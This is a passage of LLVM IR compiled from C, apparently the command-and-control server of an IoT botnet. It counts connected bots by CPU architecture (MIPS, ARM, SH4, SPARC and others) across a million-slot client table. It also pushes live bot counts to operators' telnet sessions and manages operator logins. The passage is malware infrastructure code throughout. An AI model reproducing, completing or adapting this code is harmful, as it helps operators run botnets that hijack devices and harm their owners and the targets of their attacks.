  %266 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %267 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %266, i32 0, i32 0
  %268 = load i32, i32* %267, align 4
  %269 = call i8* @get_host(i32 %268)
  %270 = load i8*, i8** %19, align 8
  %271 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.27, i64 0, i64 0), i8* %269, i8* %270)
  %272 = getelementptr inbounds [60 x i8], [60 x i8]* %20, i64 0, i64 0
  %273 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %274 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 4
  %276 = call i8* @get_host(i32 %275)
  %277 = call i32 (i8*, i8*, ...) @sprintf(i8* %272, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.28, i64 0, i64 0), i8* %276) #8
  br label %281

278:                                              ; preds = %249
  %279 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %280 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i64 0, i64 0), i8* %279)
  br label %281

281:                                              ; preds = %278, %253
  br label %201, !llvm.loop !17

282:                                              ; preds = %226, %216, %210
  %283 = load i64, i64* %16, align 8
  %284 = icmp eq i64 %283, -1
  br i1 %284, label %285, label %291

285:                                              ; preds = %282
  %286 = call i32* @__errno_location() #10
  %287 = load i32, i32* %286, align 4
  %288 = icmp ne i32 %287, 11
  br i1 %288, label %289, label %290

289:                                              ; preds = %285
  store i32 1, i32* %15, align 4
  br label %290

290:                                              ; preds = %289, %285
  br label %297

291:                                              ; preds = %282
  %292 = load i64, i64* %16, align 8
  %293 = icmp eq i64 %292, 0
  br i1 %293, label %294, label %295

294:                                              ; preds = %291
  store i32 1, i32* %15, align 4
  br label %297

295:                                              ; preds = %291
  br label %296

296:                                              ; preds = %295
  br label %199

297:                                              ; preds = %294, %290
  %298 = load i32, i32* %15, align 4
  %299 = icmp ne i32 %298, 0
  br i1 %299, label %300, label %316

300:                                              ; preds = %297
  %301 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %302 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %301, i32 0, i32 2
  store i8 0, i8* %302, align 1
  %303 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %304 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %303, i32 0, i32 3
  %305 = getelementptr inbounds [30 x i8], [30 x i8]* %304, i64 0, i64 0
  %306 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %305, i64 30, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.31, i64 0, i64 0)) #8
  %307 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %308 = load i32, i32* %13, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %307, i64 %309
  %311 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %310, i32 0, i32 3
  %312 = getelementptr inbounds [30 x i8], [30 x i8]* %311, i64 0, i64 0
  %313 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %312, i64 30, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.31, i64 0, i64 0)) #8
  %314 = load i32, i32* %13, align 4
  %315 = call i32 @close(i32 %314)
  br label %316

316:                                              ; preds = %300, %297
  br label %317

317:                                              ; preds = %316
  br label %318

318:                                              ; preds = %317
  br label %319

319:                                              ; preds = %318, %185, %58
  %320 = load i32, i32* %7, align 4
  %321 = add nsw i32 %320, 1
  store i32 %321, i32* %7, align 4
  br label %27, !llvm.loop !18

322:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #2

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.135, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.135, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #2

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !19

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8*], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %24
  %8 = getelementptr inbounds [2048 x i8*], [2048 x i8*]* %4, i64 0, i64 0
  %9 = bitcast i8** %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 2048, i1 false)
  %10 = getelementptr inbounds [2048 x i8*], [2048 x i8*]* %4, i64 0, i64 0
  %11 = bitcast i8** %10 to i8*
  %12 = call i32 @clientsConnected()
  %13 = load volatile i32, i32* @managesConnected, align 4
  %14 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.32, i64 0, i64 0), i32 27, i32 %12, i32 %13, i32 7) #8
  %15 = load i32, i32* %3, align 4
  %16 = getelementptr inbounds [2048 x i8*], [2048 x i8*]* %4, i64 0, i64 0
  %17 = bitcast i8** %16 to i8*
  %18 = getelementptr inbounds [2048 x i8*], [2048 x i8*]* %4, i64 0, i64 0
  %19 = bitcast i8** %18 to i8*
  %20 = call i64 @strlen(i8* %19) #9
  %21 = call i64 @send(i32 %15, i8* %17, i64 %20, i32 16384)
  %22 = icmp eq i64 %21, -1
  br i1 %22, label %23, label %24

23:                                               ; preds = %7
  ret i8* null

24:                                               ; preds = %7
  %25 = call i32 @sleep(i32 3)
  br label %7
}

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1024 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.33, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 1024, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #9
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !20

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @countArch() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* @ppc, align 4
  store i32 0, i32* @sh4, align 4
  store i32 0, i32* @x86, align 4
  store i32 0, i32* @armv4, align 4
  store i32 0, i32* @armv7, align 4
  store i32 0, i32* @mips, align 4
  store i32 0, i32* @m68k, align 4
  store i32 0, i32* @sparc, align 4
  store i32 0, i32* @mipsel, align 4
  store i32 0, i32* @unknown, align 4
  store i32 0, i32* %1, align 4
  br label %2

2:                                                ; preds = %221, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 1000000
  br i1 %4, label %5, label %224

5:                                                ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %7
  %9 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %8, i32 0, i32 3
  %10 = getelementptr inbounds [30 x i8], [30 x i8]* %9, i64 0, i64 0
  %11 = call i8* @strstr(i8* %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i64 0, i64 0)) #9
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %24

13:                                               ; preds = %5
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %15
  %17 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %16, i32 0, i32 2
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = icmp eq i32 %19, 1
  br i1 %20, label %21, label %24

21:                                               ; preds = %13
  %22 = load i32, i32* @ppc, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* @ppc, align 4
  br label %220

24:                                               ; preds = %13, %5
  %25 = load i32, i32* %1, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %26
  %28 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %27, i32 0, i32 3
  %29 = getelementptr inbounds [30 x i8], [30 x i8]* %28, i64 0, i64 0
  %30 = call i8* @strstr(i8* %29, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i64 0, i64 0)) #9
  %31 = icmp ne i8* %30, null
  br i1 %31, label %32, label %43

32:                                               ; preds = %24
  %33 = load i32, i32* %1, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %34
  %36 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %35, i32 0, i32 2
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %43

40:                                               ; preds = %32
  %41 = load i32, i32* @sh4, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* @sh4, align 4
  br label %219

43:                                               ; preds = %32, %24
  %44 = load i32, i32* %1, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %45
  %47 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %46, i32 0, i32 3
  %48 = getelementptr inbounds [30 x i8], [30 x i8]* %47, i64 0, i64 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i64 0, i64 0)) #9
  %50 = icmp ne i8* %49, null
  br i1 %50, label %67, label %51

51:                                               ; preds = %43
  %52 = load i32, i32* %1, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %53
  %55 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %54, i32 0, i32 3
  %56 = getelementptr inbounds [30 x i8], [30 x i8]* %55, i64 0, i64 0
  %57 = call i8* @strstr(i8* %56, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i64 0, i64 0)) #9
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %70

59:                                               ; preds = %51
  %60 = load i32, i32* %1, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %61
  %63 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %62, i32 0, i32 2
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %65, 1
  br i1 %66, label %67, label %70

67:                                               ; preds = %59, %43
  %68 = load i32, i32* @x86, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* @x86, align 4
  br label %218

70:                                               ; preds = %59, %51
  %71 = load i32, i32* %1, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %72
  %74 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %73, i32 0, i32 3
  %75 = getelementptr inbounds [30 x i8], [30 x i8]* %74, i64 0, i64 0
  %76 = call i8* @strstr(i8* %75, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0)) #9
  %77 = icmp ne i8* %76, null
  br i1 %77, label %78, label %89

78:                                               ; preds = %70
  %79 = load i32, i32* %1, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %80
  %82 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %81, i32 0, i32 2
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 1
  br i1 %85, label %86, label %89

86:                                               ; preds = %78
  %87 = load i32, i32* @armv4, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* @armv4, align 4
  br label %217

89:                                               ; preds = %78, %70
  %90 = load i32, i32* %1, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %91
  %93 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %92, i32 0, i32 3
  %94 = getelementptr inbounds [30 x i8], [30 x i8]* %93, i64 0, i64 0
  %95 = call i8* @strstr(i8* %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0)) #9
  %96 = icmp ne i8* %95, null
  br i1 %96, label %97, label %108

97:                                               ; preds = %89
  %98 = load i32, i32* %1, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %99
  %101 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %100, i32 0, i32 2
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = icmp eq i32 %103, 1
  br i1 %104, label %105, label %108

105:                                              ; preds = %97
  %106 = load i32, i32* @armv7, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* @armv7, align 4
  br label %216

108:                                              ; preds = %97, %89
  %109 = load i32, i32* %1, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %110
  %112 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %111, i32 0, i32 3
  %113 = getelementptr inbounds [30 x i8], [30 x i8]* %112, i64 0, i64 0
  %114 = call i8* @strstr(i8* %113, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.41, i64 0, i64 0)) #9
  %115 = icmp ne i8* %114, null
  br i1 %115, label %132, label %116

116:                                              ; preds = %108
  %117 = load i32, i32* %1, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %118
  %120 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %119, i32 0, i32 3
  %121 = getelementptr inbounds [30 x i8], [30 x i8]* %120, i64 0, i64 0
  %122 = call i8* @strstr(i8* %121, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i64 0, i64 0)) #9
  %123 = icmp ne i8* %122, null
  br i1 %123, label %124, label %135

124:                                              ; preds = %116
  %125 = load i32, i32* %1, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %126
  %128 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %127, i32 0, i32 2
  %129 = load i8, i8* %128, align 1
  %130 = sext i8 %129 to i32
  %131 = icmp eq i32 %130, 1
  br i1 %131, label %132, label %135

132:                                              ; preds = %124, %108
  %133 = load i32, i32* @mipsel, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* @mipsel, align 4
  br label %215

135:                                              ; preds = %124, %116
  %136 = load i32, i32* %1, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %137
  %139 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %138, i32 0, i32 3
  %140 = getelementptr inbounds [30 x i8], [30 x i8]* %139, i64 0, i64 0
  %141 = call i8* @strstr(i8* %140, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.43, i64 0, i64 0)) #9
  %142 = icmp ne i8* %141, null
  br i1 %142, label %143, label %154

143:                                              ; preds = %135
  %144 = load i32, i32* %1, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %145
  %147 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %146, i32 0, i32 2
  %148 = load i8, i8* %147, align 1
  %149 = sext i8 %148 to i32
  %150 = icmp eq i32 %149, 1
  br i1 %150, label %151, label %154

151:                                              ; preds = %143
  %152 = load i32, i32* @mips, align 4
  %153 = add nsw i32 %152, 1
  store i32 %153, i32* @mips, align 4
  br label %214

154:                                              ; preds = %143, %135
  %155 = load i32, i32* %1, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %156
  %158 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %157, i32 0, i32 3
  %159 = getelementptr inbounds [30 x i8], [30 x i8]* %158, i64 0, i64 0
  %160 = call i8* @strstr(i8* %159, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i64 0, i64 0)) #9
  %161 = icmp ne i8* %160, null
  br i1 %161, label %162, label %173

162:                                              ; preds = %154
  %163 = load i32, i32* %1, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %164
  %166 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %165, i32 0, i32 2
  %167 = load i8, i8* %166, align 1
  %168 = sext i8 %167 to i32
  %169 = icmp eq i32 %168, 1
  br i1 %169, label %170, label %173

170:                                              ; preds = %162
  %171 = load i32, i32* @m68k, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* @m68k, align 4
  br label %213

173:                                              ; preds = %162, %154
  %174 = load i32, i32* %1, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %175
  %177 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %176, i32 0, i32 3
  %178 = getelementptr inbounds [30 x i8], [30 x i8]* %177, i64 0, i64 0
  %179 = call i8* @strstr(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i64 0, i64 0)) #9
  %180 = icmp ne i8* %179, null
  br i1 %180, label %181, label %192

181:                                              ; preds = %173
  %182 = load i32, i32* %1, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %183
  %185 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 1
  %187 = sext i8 %186 to i32
  %188 = icmp eq i32 %187, 1
  br i1 %188, label %189, label %192

189:                                              ; preds = %181
  %190 = load i32, i32* @sparc, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* @sparc, align 4
  br label %212

192:                                              ; preds = %181, %173
  %193 = load i32, i32* %1, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %194
  %196 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %195, i32 0, i32 3
  %197 = getelementptr inbounds [30 x i8], [30 x i8]* %196, i64 0, i64 0
  %198 = call i8* @strstr(i8* %197, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.46, i64 0, i64 0)) #9
  %199 = icmp ne i8* %198, null
  br i1 %199, label %200, label %211

200:                                              ; preds = %192
  %201 = load i32, i32* %1, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %203, i32 0, i32 2
  %205 = load i8, i8* %204, align 1
  %206 = sext i8 %205 to i32
  %207 = icmp eq i32 %206, 1
  br i1 %207, label %208, label %211

208:                                              ; preds = %200
  %209 = load i32, i32* @unknown, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* @unknown, align 4
  br label %211

211:                                              ; preds = %208, %200, %192
  br label %212

212:                                              ; preds = %211, %189
  br label %213

213:                                              ; preds = %212, %170
  br label %214

214:                                              ; preds = %213, %151
  br label %215

215:                                              ; preds = %214, %132
  br label %216

216:                                              ; preds = %215, %105
  br label %217

217:                                              ; preds = %216, %86
  br label %218

218:                                              ; preds = %217, %67
  br label %219

219:                                              ; preds = %218, %40
  br label %220

220:                                              ; preds = %219, %21
  br label %221

221:                                              ; preds = %220
  %222 = load i32, i32* %1, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %1, align 4
  br label %2, !llvm.loop !21

224:                                              ; preds = %2
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.telnetListenerArgs*, align 8
  %5 = alloca [80 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [2048 x i8], align 16
  %16 = alloca %struct._IO_FILE*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct._IO_FILE*, align 8
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [60 x i8*], align 16
  %26 = alloca [100 x i8*], align 16
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca [50 x i8*], align 16
  %32 = alloca i32, align 4
  %33 = alloca [200 x i8*], align 16
  %34 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %35 = load i8*, i8** %3, align 8
  %36 = bitcast i8* %35 to %struct.telnetListenerArgs*
  store %struct.telnetListenerArgs* %36, %struct.telnetListenerArgs** %4, align 8
  %37 = load %struct.telnetListenerArgs*, %struct.telnetListenerArgs** %4, align 8
  %38 = getelementptr inbounds %struct.telnetListenerArgs, %struct.telnetListenerArgs* %37, i32 0, i32 0
  %39 = load i32, i32* %38, align 4
  store i32 %39, i32* %6, align 4
  %40 = load %struct.telnetListenerArgs*, %struct.telnetListenerArgs** %4, align 8
  %41 = getelementptr inbounds %struct.telnetListenerArgs, %struct.telnetListenerArgs* %40, i32 0, i32 1
  %42 = load i32, i32* %41, align 4
  %43 = call i8* @get_host(i32 %42)
  store i8* %43, i8** %7, align 8
  %44 = load volatile i32, i32* @managesConnected, align 4
  %45 = add nsw i32 %44, 1
  store volatile i32 %45, i32* @managesConnected, align 4
  %46 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %46, i8 0, i64 2048, i1 false)
  %47 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %47, i8 0, i64 2048, i1 false)
  %48 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %48, i8 0, i64 2048, i1 false)
  store i32 0, i32* %17, align 4
